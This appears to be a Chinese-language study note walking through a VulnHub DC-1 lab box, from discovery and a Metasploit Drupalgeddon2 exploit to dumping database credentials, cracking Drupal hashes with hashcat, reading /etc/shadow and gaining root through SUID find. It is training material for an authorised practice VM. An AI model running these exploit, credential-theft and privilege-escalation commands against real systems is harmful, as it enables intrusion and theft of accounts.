# 2026-08-15 DC-1 靶机渗透实战（VulnHub 完整流程）

> 状态：✅ 实操过（2026-08-15 打通，root 提权完成）
> 靶机：DC-1（VulnHub）· 攻击机：Kali 2025 · 网段：192.168.96.0/24（VMware NAT 自定义网段）

---

## 一、题目 → 思路

- **目标**：DC-1 靶机，拿到 root + 找齐全部 flag
- **一句话认知**：入门级综合靶机，考的是**完整渗透流程** —— 资产发现 → Web 漏洞利用 → 数据库 → 后台 → SUID 提权
- **考点**：Drupal 老版本 RCE（Drupalgeddon2）、配置文件挖凭据、hashcat 破 Drupal7 hash、SUID find 提权

## 二、过程

### 1. 环境准备（踩坑记录）

- 靶机镜像：`DC-1.ova`（vulnhub.com 官方下载，768MB，走的是官方源，国内网络可达）
- **坑①**：MSYS 中文路径写文件报错 → 用英文路径 `Desktop/vulnhub/DC1`
- **坑②**：Kali 的 VMware NAT 网段**不是默认 10.0.2.x**，是自定义的 `192.168.96.0/24`
- **坑③**：DC-1 默认导入是 **bridged 模式**，和 NAT 的 Kali 不同网段 → 改 NAT 才能互通

### 2. 资产发现 + 端口扫描

```bash
sudo netdiscover -r 192.168.96.0/24    # 找靶机 IP → 192.168.96.134
nmap -sV -sC 192.168.96.134            # 22 SSH + 80 HTTP (Apache 2.2.22)
```

- 老 Debian + 老 Apache → 老系统漏洞多

### 3. Web 指纹 + 漏洞利用（拿 shell）

- 80 端口 → Drupal 7.x（CHANGELOG.txt 看版本）
- Drupalgeddon2（CVE-2018-7600）→ msf 模块 `exploit/unix/webapp/drupal_drupalgeddon2`

```text
set RHOSTS 192.168.96.134
set LHOST 192.168.96.132      # Kali 自己的 IP（ip addr 确认，别填错）
run
```

- 拿到 meterpreter → `shell` → `whoami` = www-data
- **坑④**：meterpreter 不是完整 shell，`find` 不可用 → 输入 `shell` 进系统 shell
- **坑⑤**：`find / -exec whoami \;` 会遍历全盘刷屏 → 加 `| head -5` 或 `-maxdepth` 限制

### 4. flag1 → 配置文件挖凭据

```bash
ls -la /var/www/          # flag1 在这
cat /var/www/flag1.txt    # 提示：每个 CMS 都有 config 文件
cat /var/www/html/sites/default/settings.php | grep -iE "database|password|user"
```

- **拿到数据库凭据**：`deuser / R0ck3t / drupaldb`
- **坑⑥**：`mysql -p '密码'` 中间有空格会被当成数据库名 → 必须 `-p'密码'` 紧贴
- 连库：`mysql -u deuser -p'R0ck3t' drupaldb -e "show tables;"`
- users 表 → admin 密码 hash：`$S$DvQI6Y600...`（Drupal7 格式）

### 5. hashcat 破 Drupal7 hash（拿后台密码）

- **坑⑦**：hash 里 `$S$` 会被 bash 当成变量展开 → 用单引号 `echo '$S$...'`
- **坑⑧**：Kali 虚拟机（2GB 内存）hashcat GPU 模式报 "Not enough device memory" → 虚拟机里 hashcat 跑不动
- **解决方案**：宿主机 Windows 跑 hashcat（RTX 4060 GPU），下载 hashcat + rockyou（ghfast.top 镜像）

```bash
# 宿主机（Windows）
hashcat -m 7900 -a 0 admin.hash rockyou.txt    # Drupal7 = 7900
```

- **结果**：`admin / 53cr3t`（"secret" 的 leetspeak：5=S、3=E）—— 33,619 H/s，1 分钟出
- **坑⑨**：RTX 4060 满载 83°C，连续跑第二个任务可能 OpenCL 报错（过热/驱动）→ 等降温或换 `-d 2` 核显

### 6. 后台登录 → flag3 线索

- 浏览器 `http://192.168.96.134/user/login` → `admin / 53cr3t`
- 登录后**查看评论（comments）** → 找到 flag3：**"Special PERMS will help FIND the passwd - but you'll need to -exec that command"**
- 翻译：SUID 权限 + find 命令 + -exec 参数 → 读 /etc/shadow

### 7. SUID 提权（核心考点）

```bash
find / -perm -4000 2>/dev/null       # 确认 /usr/bin/find 有 SUID (rws)
find / -exec whoami \; | head -5     # 输出 root = SUID 生效
find /etc -name shadow -exec cat {} \; 2>/dev/null   # 读 shadow
```

- **坑⑩**：meterpreter 的 shell 不是 TTY → `su` 报 "must be run from a terminal" → 用 `python -c 'import pty; pty.spawn("/bin/bash")'` 伪造 TTY
- **坑⑪**：`su root` 失败 → 因为破解的 orange 是 **flag4 用户的密码**（/etc/passwd 里的 hash），不是 root 的
- 用 SUID find 读 shadow → 拿到 **root 的 hash**（`$6$rhe3rFqk$...`）

### 8. root 密码不在字典 → SUID find 直接提权（通关）

- hashcat `-m 1800` 全量 rockyou 跑完 **0 命中** —— root 密码不在常见字典里（靶机设计如此，不需要破 root 密码）
- **正解：SUID find 直接弹 root shell**（flag3 提示的完整答案）

```bash
find / -exec /bin/bash -p \;
id
```

- **结果**：`uid=33(www-data) euid=0(root) groups=0(root)` —— euid=0 就是 root 权限
- 通关：`cd /root && cat thefinalflag.txt`
- **知识点**：Linux 权限判断看 **euid（有效 UID）** 不看 uid；SUID 程序让进程 euid 变成文件属主（root），`-p` 参数让 bash 保留特权模式不降权

## 三、疑问解答（打靶时的问题）

### Q1: 怎么挑选合适的漏洞？
CMS 版本 → 年代 → 公开利用情况：Drupal 7.x 老版本 → 搜 "Drupal 7 RCE" → CVE-2018-7600 (Drupalgeddon2)。**优先级：老版本 + 有 MSF 模块**（验证过、省事）；没模块才找 GitHub EXP / 手工 payload。

### Q2: 为什么用 MSF？还有其他选项吗？
MSF = 利用框架，模块现成（`search drupal`）、payload 自动反弹 shell、稳定。其他选项：
- 手工 curl（理解原理，无现成模块时用）
- GitHub 现成 EXP 脚本（如 drupalgeddon2.py）
- searchsploit 本地查 exploit

### Q3: `find / -exec /bin/bash -p \;` 为什么能提权？
```
/usr/bin/find 有 SUID 位（rws，属主 root）→ find 运行时是 root 身份
-exec /bin/bash -p \; → 让 find 启动 bash，-p 保留特权（不加会降权成 www-data）
```
核心：SUID = "以文件属主的身份运行"。借 root 的手执行命令 = 提权。

## 三、怎么识别命中

- **拿 shell 成功**：`whoami` = www-data
- **SUID 生效**：`find / -exec whoami \;` 输出 root
- **提权成功**：`id` 显示 uid=0(root)

## 四、方法论沉淀

- **完整渗透闭环**：资产发现 → 端口 → 指纹 → Web 利用 → 数据库 → 后台 → 提权 → 通关
- **hashcat 用 GPU 跑**：虚拟机 CPU 8 小时 vs 宿主机 GPU 1 分钟，慢哈希必须上显卡
- **SUID 提权套路**：`find / -perm -4000` 找 SUID → 看哪个命令能执行（find -exec / vim / python）→ 弹 shell 或读敏感文件
- **密码复用**：靶机作者常用一个弱口令风格，flag4 和 root 的密码常有关联

## 五、待实践 / 疑问

- [ ] DC-2/DC-3 同系列进阶（DC-2 考 WordPress + 更多提权思路）
- [ ] 试 Kioptrix Level 1（老系统漏洞 + 内核提权）
- [ ] 学 meterpreter `getsystem` / `sessions` 常用命令，减少对 shell 的依赖
- ❓ `python -c 'import pty; pty.spawn("/bin/bash")'` 的原理（伪终端是怎么骗过 su 的）？
- ❓ SUID find 提权有没有其他变体（find -exec cp / vim 提权）？

## 关联笔记

- [服务协议与接口漏洞发现](./2026-08-14-服务协议与接口漏洞发现.md) — 资产收集、服务识别的出处
- [Web 应用漏洞发现](./2026-08-13-Web应用漏洞发现.md) — CMS 指纹、漏洞平台用法
- [RCE 远程代码命令执行详解](./2026-08-05-RCE远程代码命令执行详解.md) — Drupalgeddon2 本质

> ⚠️ 声明：仅用于授权靶场环境（VulnHub 官方练习靶机）。
